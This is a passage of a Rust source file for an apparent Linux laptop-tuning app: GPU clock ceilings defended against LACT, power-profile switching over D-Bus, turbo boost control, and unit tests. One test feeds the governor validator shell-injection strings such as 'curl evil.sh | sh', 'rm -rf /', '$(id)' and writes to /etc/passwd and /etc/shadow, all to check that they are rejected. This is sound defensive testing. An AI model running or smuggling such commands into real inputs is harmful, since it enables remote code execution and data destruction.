/// it. A gap there is enough for the watcher to read the level it is replacing
/// while the card is already gone from the GPU, and to put it back.
struct GpuWriteInFlight;

impl GpuWriteInFlight {
    fn begin() -> Self {
        GPU_WRITES_IN_FLIGHT.fetch_add(1, Ordering::SeqCst);
        Self
    }
}

impl Drop for GpuWriteInFlight {
    fn drop(&mut self) {
        GPU_WRITES_IN_FLIGHT.fetch_sub(1, Ordering::SeqCst);
    }
}

fn gpu_write_in_flight() -> bool {
    GPU_WRITES_IN_FLIGHT.load(Ordering::SeqCst) > 0
}

/// Write a ceiling to the GPU, through the one path the view also uses: resolve
/// the node, take the card from LACT, write the level set, read it back.
///
/// On success the write is recorded as the one on the card, for `source`. That
/// record is what lets the next pass tell "the ceiling I wrote is still there"
/// from "a different source's ceiling is", which the hardware cannot.
async fn apply_gpu_clock_level(source: GpuPowerSource, level: u32) -> Result<String, String> {
    let Some((sclk, levels)) = gpu_sclk_and_levels() else {
        return Err(
            "No AMD GPU clock interface was found, so the GPU cannot be capped".to_string(),
        );
    };

    let message = write_gpu_clock_cap(&sclk, &levels, Some(level)).await?;
    remember_gpu_ceiling(Some((source, level)));
    Ok(message)
}

/// Take this app's ceiling off the GPU and give the card back.
///
/// Every level is enabled again — `auto`, which is where the machine was before
/// the ceiling existed — and the card goes back to LACT when it manages one. The
/// record of the last write is dropped with it, so nothing later mistakes this
/// for a claim that is still held.
///
/// A hand-back that fails is not a failed release: the ceiling really is gone,
/// so it is said alongside the result rather than instead of it.
async fn release_claim(sclk: &Path, levels: &[GpuClockLevel]) -> Result<String, String> {
    let message = write_gpu_clock_cap(sclk, levels, None).await?;
    remember_gpu_ceiling(None);

    Ok(match hand_back_to_lact(sclk) {
        Ok(true) => format!("{message}; LACT is managing this GPU again"),
        Ok(false) => message,
        Err(error) => format!("{message}, but {error}"),
    })
}

/// Give up a ceiling this app wrote for a source that is no longer in force.
///
/// `Ok(None)` is the ordinary answer: the source in force holds no ceiling and
/// the card holds none of this app's either. The write happens on the pass after
/// the machine moves to a source whose column is empty while a ceiling written
/// for another source is still on the card, and that is the only pass it happens
/// on — the record is dropped with the ceiling.
async fn release_gpu_clock(source: GpuPowerSource) -> Result<Option<String>, String> {
    if !gpu_release_needed(gpu_last_ceiling(), source) {
        return Ok(None);
    }

    let Some((sclk, levels)) = gpu_sclk_and_levels() else {
        return Err(
            "No AMD GPU clock interface was found, so the held GPU ceiling cannot be \
             released"
                .to_string(),
        );
    };

    release_claim(&sclk, &levels)
        .await
        .map(|message| Some(format!("no ceiling {}: {message}", source.label())))
}

/// Put the GPU back under the ceiling `source` holds if it is no longer there.
///
/// `Ok(None)` is the answer on every pass but the one after the ceiling is lost
/// or the source changes: the level is in force, so nothing is detached and
/// nothing is written. That is where the loop spends its life, and it is why a
/// watcher can run this often at all. `Ok(Some(..))` carries the message from the
/// write that put it there.
async fn reassert_gpu_clock(source: GpuPowerSource, level: u32) -> Result<Option<String>, String> {
    let Some((sclk, _)) = gpu_sclk_and_levels() else {
        return Err(
            "No AMD GPU clock interface was found, so the held GPU ceiling cannot be \
                    re-applied"
                .to_string(),
        );
    };

    if gpu_ceiling_holds(&sclk, gpu_last_ceiling(), source, level) {
        return Ok(None);
    }

    apply_gpu_clock_level(source, level)
        .await
        .map(|message| Some(format!("{}: {message}", source.label())))
}

/// How often the GPU watcher checks that the ceiling it saved is still in force.
///
/// One `power_dpm_force_performance_level` read per pass, which is what makes an
/// interval this short affordable. It is also the longest the operator waits for
/// the ceiling to come back after `lactd` takes the card.
const GPU_POLL_INTERVAL: Duration = Duration::from_secs(5);

/// How long to wait after a re-apply that failed.
///
/// A re-apply that failed has nothing left to wait on: the write is passwordless
/// now, so nothing was asked of the operator and nothing is going to be. What a
/// failure means is the hardware or the installed helper, and neither is repaired
/// by asking again five seconds later. The retry is still worth making -- a write
/// can race the daemon it is taking the card from -- but at a rate that does not
/// turn one broken machine into a line of errors every poll.
const GPU_REAPPLY_RETRY_INTERVAL: Duration = Duration::from_secs(30);

/// Emitted when the watcher writes the GPU, so the view can stop showing LACT as
/// the one writing this level. It covers both writes a pass can make: the ceiling
/// put back, and a claim for another source given up.
const GPU_SETTLED_EVENT: &str = "gpu-clock-settled";

/// One pass of the GPU watcher.
///
/// Everything the pass decides from is read every pass rather than remembered —
/// the ceilings, which source is in force, and the profile that tells the two
/// battery columns apart — so a ceiling the view sets or clears takes effect on
/// the next pass with no handshake between the two.
///
/// This is also the switch. A power-source change is noticed here, by the same
/// check that notices `lactd` taking the card back: the level in force is not the
/// level the source wants, so the pass writes. No new watcher, timer or udev hook
/// is needed for it.
async fn gpu_clock_tick(app: &AppHandle) -> Result<Option<String>, String> {
    let state = crate::settings::load_gpu_watch_state(app);

    // The view is writing a level of its own: reading the store again on the
    // next pass is enough, and writing here would race the operator's choice.
    if gpu_write_in_flight() {
        return Ok(None);
    }

    let source = gpu_source(crate::battery::is_ac_online(), &state.power_profile);

    match state.ceilings.get(source) {
        Some(level) => reassert_gpu_clock(source, level).await,
        None => release_gpu_clock(source).await,
    }
}

/// Keep the saved GPU ceiling in force for as long as the app runs.
///
/// A ceiling is written once and then has to be defended. `lactd` re-applies the
/// performance level from `/etc/lact/config.yaml` whenever it starts, and the
/// detach this app does before writing is runtime-only — it is not in that file,
/// and LACT's API has no field to put it in. So the card is re-taken rather than
/// held, and what is watched is the only thing that can be read honestly:
/// whether the ceiling for the source in force is still the one on the card.
///
/// A pass with the ceiling in force writes nothing: that is the ordinary case,
/// one sysfs read, and it is what keeps this from being a re-apply loop. A pass
/// that fails to write backs off instead of repeating on the poll interval.
pub async fn gpu_clock_watcher(app: AppHandle) {
    loop {
        let wait = match gpu_clock_tick(&app).await {
            Ok(Some(message)) => {
                println!("[Performance] GPU ceiling settled: {}", message);
                // The view shows whoever holds the card now, and lactd being the
                // one that took it back is what makes it wrong at this moment.
                let _ = app.emit(GPU_SETTLED_EVENT, ());
                GPU_POLL_INTERVAL
            }
            Ok(None) => GPU_POLL_INTERVAL,
            Err(error) => {
                eprintln!("[Performance] GPU ceiling not settled: {}", error);
                GPU_REAPPLY_RETRY_INTERVAL
            }
        };

        tokio::time::sleep(wait).await;
    }
}

/// Remember the ceilings this app holds, and say so when the store will not take
/// them.
///
/// A store that cannot be written must not turn a written ceiling into a failed
/// one: the GPU really is capped, and what is lost is only the memory of it.
async fn remember_gpu_ceilings(app: &AppHandle, ceilings: GpuCeilings) {
    if let Err(error) = crate::settings::save_gpu_ceilings(app, ceilings).await {
        eprintln!(
            "[Performance] could not remember the GPU ceilings: {}",
            error
        );
    }
}

/// The hardware's clock ranges and the GPU levels on offer.
///
/// Async only because working out who owns the GPU means asking lactd, and a
/// daemon that has stopped answering would otherwise freeze the view for the
/// length of the socket timeout.
#[tauri::command]
pub async fn get_clock_limits(app: AppHandle) -> ApiResponse<ClockLimits> {
    let (hw_min, hw_max) = cpu_freq_bounds_khz().unwrap_or((0, 0));
    let read_scaling = |file: &str| -> u64 {
        fs::read_to_string(format!("{}/{}", CPU_FREQ_DIR, file))
            .ok()
            .and_then(|raw| raw.trim().parse::<u64>().ok())
            .unwrap_or(0)
    };

    let gpu = gpu_sclk_and_levels();
    let levels = gpu
        .as_ref()
        .map(|(_, levels)| levels.clone())
        .unwrap_or_default();
    let gpu_found = !levels.is_empty();
    let owner = gpu_owner(gpu.as_ref().map(|(path, _)| path.as_path()));

    // The same two reads the watcher makes, from the same place: the ceilings
    // this app holds and the profile that decides which column is in force.
    let state = crate::settings::load_gpu_watch_state(&app);
    let source = gpu_source(crate::battery::is_ac_online(), &state.power_profile);

    let (policy_lists, lowest_nonlinear_khz) = read_policy_frequency_inputs();

    ok(ClockLimits {
        cpu_hw_min_khz: hw_min,
        cpu_hw_max_khz: hw_max,
        cpu_scaling_min_khz: read_scaling("scaling_min_freq"),
        cpu_scaling_max_khz: read_scaling("scaling_max_freq"),
        cpu_frequencies: build_ladder(&policy_lists, hw_min, hw_max, lowest_nonlinear_khz),
        gpu_levels: levels,
        gpu_found,
        gpu_held_levels: state.ceilings,
        gpu_source: source,
        gpu_owner: owner,
    })
}

/// Hold `level` for `source`, writing it to the GPU only if that source is the
/// one in force.
///
/// A ceiling for a source that is not in force is a promise for later, not a
/// change now: writing it would cap the machine against the column it is
/// actually running under, and the next watcher pass would undo it anyway. The
/// machine moving to that source is what puts it on the card, and the watcher is
/// what notices.
#[tauri::command]
pub async fn set_gpu_clock_level(
    app: AppHandle,
    source: GpuPowerSource,
    level: u32,
) -> ApiResponse<String> {
    let Some((_sclk, levels)) = gpu_sclk_and_levels() else {
        return failure(
            "No AMD GPU clock interface was found, so the GPU cannot be capped".to_string(),
        );
    };

    // The same check the write makes, made here as well: a level this card does
    // not offer must not reach the store, where the watcher would try it again
    // every five seconds from then on.
    let Some(freq_mhz) = levels.iter().find(|l| l.level == level).map(|l| l.freq_mhz) else {
        return failure(format!("This GPU has no clock level {}", level));
    };

    // Held across the settings write at the end as well: the watcher must not
    // see the ceiling this replaces still saved while the GPU is between the two.
    let _in_flight = GpuWriteInFlight::begin();

    let state = crate::settings::load_gpu_watch_state(&app);
    let active = gpu_source(crate::battery::is_ac_online(), &state.power_profile);

    let message = if active == source {
        match apply_gpu_clock_level(source, level).await {
            Ok(message) => message,
            Err(error) => return failure(error),
        }
    } else {
        format!(
            "GPU ceiling {} set to level {} ({} MHz); it takes effect when the machine \
             switches there",
            source.label(),
            level,
            freq_mhz
        )
    };

    // Only now: a ceiling remembered beside a refused write would be re-applied
    // from then on by the watcher.
    let mut ceilings = state.ceilings;
    ceilings.set(source, Some(level));
    remember_gpu_ceilings(&app, ceilings).await;

    ok(message)
}

/// Forget the ceiling held for `source`, and take it off the GPU if that source
/// is the one in force.
///
/// Clearing a column that is not in force is only a keep-this-empty promise:
/// nothing of this app's is on the card for it, so nothing is detached and
/// nothing is written. Clearing the one in force is the end of this app's claim
/// on the card, exactly as it was when the ceiling was machine-wide — every level
/// back to `auto`, and the card to whoever was managing it before.
#[tauri::command]
pub async fn clear_gpu_clock_cap(app: AppHandle, source: GpuPowerSource) -> ApiResponse<String> {
    // Held for the length of this command: what the watcher must not see is a
    // held ceiling still in the store while it is already off the GPU.
    let _in_flight = GpuWriteInFlight::begin();

    let state = crate::settings::load_gpu_watch_state(&app);
    let active = gpu_source(crate::battery::is_ac_online(), &state.power_profile);

    let message = if active == source {
        let Some((sclk, levels)) = gpu_sclk_and_levels() else {
            return failure(
                "No AMD GPU clock interface was found, so there is no GPU ceiling to remove"
                    .to_string(),
            );
        };

        match release_claim(&sclk, &levels).await {
            Ok(message) => message,
            Err(error) => return failure(error),
        }
    } else {
        format!(
            "No GPU ceiling is held {}; the column stays empty",
            source.label()
        )
    };

    let mut ceilings = state.ceilings;
    ceilings.set(source, None);
    remember_gpu_ceilings(&app, ceilings).await;

    ok(message)
}

/// Hand the GPU back to LACT without touching which clock levels are enabled.
///
/// Separate from `clear_gpu_clock_cap` on purpose: this one leaves the level
/// list where it is and lets LACT's own config take the card over, instead of
/// writing every level back to `auto` first. The view offers it whenever this
/// app is the one writing.
///
/// What both of them do is end the claim — this one for every source at once,
/// because it is the whole card that is given up, not one column of it. A
/// ceiling kept through a hand-back would be re-applied by [`gpu_clock_watcher`]
/// a few seconds later, which would make the button look broken rather than give
/// the card up.
#[tauri::command]
pub async fn reattach_gpu(app: AppHandle) -> ApiResponse<String> {
    let Some(sclk) = gpu_sclk_path() else {
        return failure(
            "No AMD GPU clock interface was found, so there is no GPU to hand back".to_string(),
        );
    };

    // Held for the length of this command: between the card going back to LACT
    // and the ceilings being forgotten, a watcher pass would put one back.
    let _in_flight = GpuWriteInFlight::begin();

    match hand_back_to_lact(&sclk) {
        Ok(true) => {
            remember_gpu_ceiling(None);
            remember_gpu_ceilings(&app, GpuCeilings::default()).await;
            ok(
                "LACT is managing this GPU again; the clock ceilings this app held have \
                 been dropped with it"
                    .to_string(),
            )
        }
        Ok(false) => {
            remember_gpu_ceiling(None);
            remember_gpu_ceilings(&app, GpuCeilings::default()).await;
            ok("There was nothing to hand back: LACT is not managing this GPU".to_string())
        }
        // The card is still this app's — it would not let go — so the ceilings
        // stay held rather than being forgotten while one is still in force.
        Err(error) => failure(error),
    }
}

// ---------------------------------------------------------------------------
// Power profiles — the daemon's D-Bus API, with TLP's own state as fallback
// ---------------------------------------------------------------------------

/// The bus name, object path and interface the profile API lives on. Plain
/// power-profiles-daemon and tlp-pd both serve this name, which is why the same
/// call reaches either of them.
const PROFILE_BUS_NAME: &str = "net.hadess.PowerProfiles";
const PROFILE_BUS_PATH: &str = "/net/hadess/PowerProfiles";

/// How often the watcher re-reads the active profile.
const PROFILE_POLL_INTERVAL: Duration = Duration::from_secs(2);

/// One property off the profile daemon through `busctl`.
///
/// `busctl` ships with systemd, so this needs no new crate — and it is the only
/// way in on a machine where the `powerprofilesctl` helper is absent, which is
/// exactly the case the old `powerprofilesctl get` branch failed on.
fn busctl_get_property(property: &str) -> Option<String> {
    let output = Command::new("busctl")
        .args([
            "--system",
            "get-property",
            PROFILE_BUS_NAME,
            PROFILE_BUS_PATH,
            PROFILE_BUS_NAME,
            property,
        ])
        .output()
        .ok()?;
    if !output.status.success() {
        return None;
    }
    Some(String::from_utf8_lossy(&output.stdout).into_owned())
}

/// The text inside one quoted `busctl` string, or `None` if it is not one.
fn unquote_dbus(token: &str) -> Option<String> {
    token
        .trim()
        .strip_prefix('"')
        .and_then(|rest| rest.strip_suffix('"'))
        .map(|value| value.to_string())
}

/// The value of a property `busctl` prints as `s "value"`.
fn parse_dbus_string(raw: &str) -> Option<String> {
    let raw = raw.trim();
    match raw.strip_prefix("s ") {
        Some(rest) => unquote_dbus(rest),
        None => raw.split_whitespace().find_map(unquote_dbus),
    }
}

/// The profile ids out of a `busctl` `Profiles` payload (`aa{sv}`).
///
/// `busctl` prints each dictionary as a run of `"Key" s "value"` tokens, so the
/// `Profile` key is found by walking whitespace-separated tokens instead of
/// trusting a fixed layout. A daemon that reorders its keys, adds a new one, or
/// prints the dictionaries with different spacing still parses. An empty result
/// means "no daemon answered", and the caller falls back to TLP.
fn parse_dbus_profiles(raw: &str) -> Vec<String> {
    let tokens: Vec<&str> = raw.split_whitespace().collect();
    let mut profiles = Vec::new();
    let mut index = 0;
    while index + 2 < tokens.len() {
        if tokens[index] == "\"Profile\"" && tokens[index + 1] == "s" {
            if let Some(profile) = unquote_dbus(tokens[index + 2]) {
                if !profile.is_empty() && !profiles.contains(&profile) {
                    profiles.push(profile);
                }
            }
            index += 3;
        } else {
            index += 1;
        }
    }
    profiles
}

/// The daemon's current and available profiles, or `None` when nothing answers.
fn dbus_profile_state() -> Option<PowerProfile> {
    let available = parse_dbus_profiles(&busctl_get_property("Profiles")?);
    if available.is_empty() {
        return None;
    }
    let current = busctl_get_property("ActiveProfile")
        .as_deref()
        .and_then(parse_dbus_string)
        .filter(|value| !value.is_empty())
        .unwrap_or_else(|| available[0].clone());
    Some(PowerProfile { current, available })
}

/// Just the active profile, for the watcher's poll: the same call as
/// [`dbus_profile_state`] without the second property read.
async fn dbus_active_profile() -> Option<String> {
    let mut command = tokio::process::Command::new("busctl");
    command
        .args([
            "--system",
            "get-property",
            PROFILE_BUS_NAME,
            PROFILE_BUS_PATH,
            PROFILE_BUS_NAME,
            "ActiveProfile",
        ])
        // Tauri tears the runtime down on exit; if that lands mid-read, killing
        // the child leaves nothing running behind the app.
        .kill_on_drop(true);
    let output = command.output().await.ok()?;
    if !output.status.success() {
        return None;
    }
    parse_dbus_string(&String::from_utf8_lossy(&output.stdout))
}

/// Ask the daemon to switch profile.
///
/// Authorisation is polkit's, not `sudo`'s: the call carries the app's own
/// identity and never needs a terminal, which is why the old `sudo tlp BAT/AC`
/// fallback could only ever fail here.
async fn dbus_set_profile(profile: &str) -> Result<(), String> {
    let output = tokio::process::Command::new("busctl")
        .args([
            "--system",
            "set-property",
            PROFILE_BUS_NAME,
            PROFILE_BUS_PATH,
            PROFILE_BUS_NAME,
            "ActiveProfile",
            "s",
            profile,
        ])
        .kill_on_drop(true)
        .output()
        .await
        .map_err(|error| format!("could not run busctl: {}", error))?;

    if output.status.success() {
        return Ok(());
    }

    let stderr = String::from_utf8_lossy(&output.stderr);
    Err(if stderr.trim().is_empty() {
        "the power daemon rejected the change".to_string()
    } else {
        stderr.trim().to_string()
    })
}

/// Which profile the machine is in, asked of whoever owns power on it.
///
/// The arbiter already answers "who owns this", so this asks it rather than
/// probing for daemons a second time. While a provider serves the D-Bus API it
/// is the authority and its list is complete — that is where `balanced` comes
/// from on a tlp-pd machine, where the old `tlp-stat`-only path could never see
/// it. Only when the arbiter finds no daemon at all does the answer come from
/// TLP's own AC/BAT state, which knows two modes and not three.
#[tauri::command]
pub fn get_power_profile() -> ApiResponse<PowerProfile> {
    let ownership = arbiter::decide(&arbiter::probe_host());

    if !matches!(ownership.capability, Capability::LimitedDirect) {
        if let Some(profile) = dbus_profile_state() {
            return ok(profile);
        }
    }

    tlp_stat_profile()
}

/// TLP's own AC/BAT state, for a machine where no daemon serves the profile API.
fn tlp_stat_profile() -> ApiResponse<PowerProfile> {
    match Command::new("tlp-stat").arg("-s").output() {
        Ok(output) if output.status.success() => {
            let stdout = String::from_utf8_lossy(&output.stdout);
            let current = if stdout.contains("AC") {
                "performance"
            } else {
                "power-saver"
            };
            ok(PowerProfile {
                current: current.to_string(),
                available: vec!["power-saver".to_string(), "performance".to_string()],
            })
        }
        _ => failure("No power daemon answered and TLP is not running".to_string()),
    }
}

#[tauri::command]
pub async fn set_power_profile(profile: String) -> ApiResponse<String> {
    if !is_known_profile(&profile) {
        return failure(format!(
            "Unknown power profile '{}'. Known profiles: {}",
            profile,
            POWER_PROFILES.join(", ")
        ));
    }

    match dbus_set_profile(&profile).await {
        Ok(()) => ok(format!("Power profile set to: {}", profile)),
        Err(error) => failure(format!("Could not set the power profile: {}", error)),
    }
}

/// Follow the active profile and tell the UI when it changes.
///
/// TLP switches profiles by itself when the power cable moves, so a value the
/// UI fetched once goes stale with nothing to correct it. `busctl monitor`
/// streams those changes, but it means holding a child process for the whole
/// life of the app and parsing its event format; a two-second property read is
/// one cheap D-Bus round-trip, compares before emitting so an unchanging
/// machine produces no events at all, and leaves no long-lived child to orphan.
pub async fn power_profile_watcher(app: AppHandle) {
    let mut last = dbus_active_profile().await;

    // The profile the GPU ceiling reads comes out of the settings store, so the
    // store has to be told what is in force — the first read included, not only
    // the changes: a machine that has not moved profile since the last session
    // would otherwise keep whatever the store was left holding. Writing before
    // the first sleep also means the store is right by the time a watcher pass
    // looks at it.
    if let Some(profile) = last.as_deref() {
        remember_tracked_power_profile(&app, profile).await;
    }

    loop {
        tokio::time::sleep(PROFILE_POLL_INTERVAL).await;

        let Some(current) = dbus_active_profile().await else {
            continue;
        };
        if last.as_deref() == Some(current.as_str()) {
            continue;
        }
        last = Some(current.clone());
        remember_tracked_power_profile(&app, &current).await;
        let _ = app.emit("power-profile-changed", current);
    }
}

/// Write the profile the app last saw into the settings store.
///
/// A store that cannot be written is not worth a failed ceiling: the profile is
/// read again on the next pass, and the ceiling for the wrong battery column for
/// one poll is a smaller wrong than dropping the watch.
async fn remember_tracked_power_profile(app: &AppHandle, profile: &str) {
    if let Err(error) = crate::settings::save_tracked_power_profile(app, profile).await {
        eprintln!(
            "[Performance] could not remember the power profile: {}",
            error
        );
    }
}

#[tauri::command]
pub fn get_turbo_boost_status() -> ApiResponse<bool> {
    let intel_pstate = "/sys/devices/system/cpu/intel_pstate/no_turbo";
    let cpufreq_boost = "/sys/devices/system/cpu/cpufreq/boost";

    // Check Intel P-state
    if let Ok(content) = fs::read_to_string(intel_pstate) {
        let no_turbo = content.trim() == "1";
        return ApiResponse {
            success: true,
            data: Some(!no_turbo), // Invert because file is "no_turbo"
            error: None,
        };
    }

    // Check cpufreq boost
    if let Ok(content) = fs::read_to_string(cpufreq_boost) {
        let boost = content.trim() == "1";
        return ApiResponse {
            success: true,
            data: Some(boost),
            error: None,
        };
    }

    ApiResponse {
        success: false,
        data: None,
        error: Some("Turbo boost control not available".to_string()),
    }
}

#[tauri::command]
pub async fn set_turbo_boost(enabled: bool) -> ApiResponse<String> {
    let intel_pstate = "/sys/devices/system/cpu/intel_pstate/no_turbo";
    let cpufreq_boost = "/sys/devices/system/cpu/cpufreq/boost";

    let value = if enabled { "0" } else { "1" }; // Inverted for no_turbo
    let boost_value = if enabled { "1" } else { "0" };

    // Try Intel P-state first
    if std::path::Path::new(intel_pstate).exists() {
        let script_content = format!(
            "#!/bin/bash\nset -e\necho {} > {}\nexit 0\n",
            value, intel_pstate
        );

        {
            if let Ok(output) = crate::privileged::run_script(&script_content).await {
                if output.status.success() {
                    return ApiResponse {
                        success: true,
                        data: Some(format!(
                            "Turbo boost {}",
                            if enabled { "enabled" } else { "disabled" }
                        )),
                        error: None,
                    };
                }
            }
        }
    }

    // Try cpufreq boost
    if std::path::Path::new(cpufreq_boost).exists() {
        let script_content = format!(
            "#!/bin/bash\nset -e\necho {} > {}\nexit 0\n",
            boost_value, cpufreq_boost
        );

        {
            if let Ok(output) = crate::privileged::run_script(&script_content).await {
                if output.status.success() {
                    return ApiResponse {
                        success: true,
                        data: Some(format!(
                            "Turbo boost {}",
                            if enabled { "enabled" } else { "disabled" }
                        )),
                        error: None,
                    };
                }
            }
        }
    }

    ApiResponse {
        success: false,
        data: None,
        error: Some("Failed to set turbo boost".to_string()),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Build a fake CPU tree and actually run the generated script against it.
    ///
    /// `online` lists the CPU indices that get a `cpufreq/scaling_governor`;
    /// any index in `present` but not `online` gets a bare `cpuN` directory,
    /// which is exactly what the kernel leaves behind for an offline CPU.
    fn run_governor_script(present: &[u32], online: &[u32]) -> (bool, String, Vec<(u32, String)>) {
        let root = std::env::temp_dir().join(format!(
            "thinkpro-vantage_gov_{}_{}",
            std::process::id(),
            std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap()
                .as_nanos()
        ));

        for cpu in present {
            let dir = root.join(format!("cpu{}", cpu));
            if online.contains(cpu) {
                let freq = dir.join("cpufreq");
                fs::create_dir_all(&freq).unwrap();
                fs::write(freq.join("scaling_governor"), "powersave\n").unwrap();
            } else {
                fs::create_dir_all(&dir).unwrap();
            }
        }

        let glob = format!("{}/cpu[0-9]*/cpufreq/scaling_governor", root.display());
        let script = governor_script("performance", &glob);

        let out = std::process::Command::new("bash")
            .arg("-c")
            .arg(&script)
            .output()
            .expect("bash runs");

        let mut written = Vec::new();
        for cpu in online {
            let p = root
                .join(format!("cpu{}", cpu))
                .join("cpufreq/scaling_governor");
            if let Ok(v) = fs::read_to_string(&p) {
                written.push((*cpu, v.trim().to_string()));
            }
        }

        let combined = format!(
            "{}{}",
            String::from_utf8_lossy(&out.stdout),
            String::from_utf8_lossy(&out.stderr)
        );
        let _ = fs::remove_dir_all(&root);
        (out.status.success(), combined, written)
    }

    /// The regression: cpu5 offline used to abort the whole script under set -e,
    /// after cpu0..cpu4 had already been changed — mixed governors, and a UI
    /// saying the operation failed.
    #[test]
    fn an_offline_cpu_does_not_abort_the_others() {
        let (ok, output, written) = run_governor_script(&[0, 1, 2, 3, 4, 5], &[0, 1, 2, 3, 4]);

        assert!(
            ok,
            "script should succeed despite cpu5 being offline:\n{output}"
        );
        assert_eq!(written.len(), 5, "every online CPU should be written");
        for (cpu, value) in &written {
            assert_eq!(value, "performance", "cpu{} kept the old governor", cpu);
        }
        assert!(
            output.contains("applied to 5 CPU(s)"),
            "should report what it actually did:\n{output}"
        );
    }

    /// Numbering is not guaranteed contiguous, and indexing 0..count assumed it.
    #[test]
    fn non_contiguous_cpu_numbering_is_handled() {
        let (ok, output, written) = run_governor_script(&[0, 3, 7], &[0, 3, 7]);

        assert!(ok, "gaps in numbering are normal:\n{output}");
        assert_eq!(written.len(), 3, "cpu0, cpu3 and cpu7 should all be set");
    }

    /// An existing-but-unwritable governor file is the case `set -e` actually
    /// aborted on, so exercise it directly: one refusal must not cost the rest.
    #[cfg(unix)]
    #[test]
    fn one_refused_write_does_not_discard_the_successful_ones() {
        use std::os::unix::fs::PermissionsExt;

        let root = std::env::temp_dir().join(format!(
            "thinkpro-vantage_gov_ro_{}_{}",
            std::process::id(),
            std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap()
                .as_nanos()
        ));

        for cpu in 0..3u32 {
            let freq = root.join(format!("cpu{}", cpu)).join("cpufreq");
            fs::create_dir_all(&freq).unwrap();
            let f = freq.join("scaling_governor");
            fs::write(&f, "powersave\n").unwrap();
            if cpu == 1 {
                fs::set_permissions(&f, fs::Permissions::from_mode(0o444)).unwrap();
            }
        }

        let glob = format!("{}/cpu[0-9]*/cpufreq/scaling_governor", root.display());
        let out = std::process::Command::new("bash")
            .arg("-c")
            .arg(governor_script("performance", &glob))
            .output()
            .expect("bash runs");
        let combined = format!(
            "{}{}",
            String::from_utf8_lossy(&out.stdout),
            String::from_utf8_lossy(&out.stderr)
        );

        let read = |cpu: u32| {
            fs::read_to_string(
                root.join(format!("cpu{}", cpu))
                    .join("cpufreq/scaling_governor"),
            )
            .unwrap()
            .trim()
            .to_string()
        };

        // Root can write through 0444, which would make this assert nothing.
        if read(1) == "performance" {
            let _ = fs::remove_dir_all(&root);
            eprintln!("skipping: running as root, 0444 is not enforced");
            return;
        }

        assert!(
            out.status.success(),
            "one unwritable CPU must not fail the whole operation:\n{combined}"
        );
        assert_eq!(read(0), "performance", "cpu0 should have been set");
        assert_eq!(read(2), "performance", "cpu2 should have been set");
        assert!(
            combined.contains("applied to 2 CPU(s), 1 refused"),
            "should report the partial result honestly:\n{combined}"
        );

        let _ = fs::remove_dir_all(&root);
    }

    /// Failing silently would be worse than failing loudly: the UI would report
    /// a governor change that never touched anything.
    #[test]
    fn no_writable_cpu_at_all_is_still_an_error() {
        let (ok, output, _) = run_governor_script(&[0, 1], &[]);

        assert!(!ok, "a total failure must surface:\n{output}");
        assert!(
            output.contains("no CPU accepted the governor"),
            "should say why:\n{output}"
        );
    }

    #[test]
    fn accepts_plain_governor_names() {
        // Character-layer only; the availability layer is machine-dependent and
        // is skipped when scaling_available_governors cannot be read.
        for g in &["performance", "powersave", "schedutil", "conservative"] {
            let result = validate_governor(g);
            if let Err(e) = &result {
                assert!(
                    e.contains("not available"),
                    "'{}' should pass the character check, got: {}",
                    g,
                    e
                );
            }
        }
    }

    /// The value reaches a root shell via pkexec, so shell metacharacters must
    /// never survive validation.
    #[test]
    fn rejects_shell_injection_payloads() {
        let payloads = [
            "performance; curl evil.sh | sh",
            "performance && rm -rf /",
            "performance\nrm -rf /",
            "$(id)",
            "`id`",
            "performance > /etc/passwd",
            "performance | tee /etc/shadow",
            "../../etc/passwd",
            "perf ormance",
            "PERFORMANCE",
            "governor2",
            "",
        ];
        for p in &payloads {
            assert!(
                validate_governor(p).is_err(),
                "expected {:?} to be rejected",
                p
            );
        }
    }

    #[test]
    fn rejects_overlong_names() {
        assert!(validate_governor(&"a".repeat(33)).is_err());
    }

    #[test]
    fn parses_sclk_levels_from_a_real_gpu() {
        let levels = parse_sclk_levels("0: 200Mhz *\n1: 700Mhz\n2: 1800Mhz\n");

        assert_eq!(levels.len(), 3);
        assert_eq!(levels[0].level, 0);
        assert_eq!(levels[0].freq_mhz, 200);
        assert!(levels[0].active, "the star marks the level in force");
        assert!(!levels[2].active);
        assert_eq!(levels[2].freq_mhz, 1800);
    }

    /// Older AMD designs print the deep-sleep level as S:, which has no numeric
    /// index. Skipping it must not empty the list and make the UI claim the
    /// machine has no GPU clocks at all.
    #[test]
    fn skips_the_deep_sleep_level_without_losing_the_rest() {
        let levels = parse_sclk_levels("S: 19Mhz *\n0: 615Mhz\n1: 800Mhz\n");

        assert_eq!(levels.len(), 2);
        assert_eq!(levels[0].level, 0);
        assert!(!levels.iter().any(|l| l.active));
    }

    /// amdgpu takes the enabled set, not one forced index: a ceiling at level 1
    /// has to leave levels 0 and 1 enabled, or the GPU loses its idle clock.
    #[test]
    fn a_ceiling_enables_every_level_up_to_and_including_it() {
        let levels = parse_sclk_levels("0: 200Mhz *\n1: 700Mhz\n2: 1800Mhz\n");

        assert_eq!(levels_up_to(&levels, 1), Some(vec![0, 1]));
        assert_eq!(levels_up_to(&levels, 0), Some(vec![0]));
        assert_eq!(levels_up_to(&levels, 2), Some(vec![0, 1, 2]));
    }

    #[test]
    fn rejects_a_ceiling_the_gpu_does_not_offer() {
        let levels = parse_sclk_levels("0: 200Mhz *\n1: 700Mhz\n2: 1800Mhz\n");
        assert_eq!(levels_up_to(&levels, 7), None);
    }

    /// The bytes `busctl --system get-property net.hadess.PowerProfiles
    /// /net/hadess/PowerProfiles net.hadess.PowerProfiles Profiles` printed on
    /// this machine, verbatim. `balanced` is the profile the old
    /// `powerprofilesctl`/`tlp-stat` path could not see.
    const REAL_PROFILES_PAYLOAD: &str = concat!(
        r#"aa{sv} 3 3 "Profile" s "power-saver" "CpuDriver" s "tlp" "PlatformDriver" s "tlp" "#,
        r#"3 "Profile" s "balanced" "CpuDriver" s "tlp" "PlatformDriver" s "tlp" "#,
        r#"3 "Profile" s "performance" "CpuDriver" s "tlp" "PlatformDriver" s "tlp""#,
    );

    #[test]
    fn parses_the_daemons_profile_list() {
        assert_eq!(
            parse_dbus_profiles(REAL_PROFILES_PAYLOAD),
            vec!["power-saver", "balanced", "performance"],
            "all three profiles, balanced included"
        );
    }

    #[test]
    fn reads_the_active_profile_out_of_the_busctl_string() {
        assert_eq!(
            parse_dbus_string("s \"power-saver\"\n").as_deref(),
            Some("power-saver")
        );
    }

    #[test]
    fn an_empty_or_shapeless_payload_yields_no_profiles() {
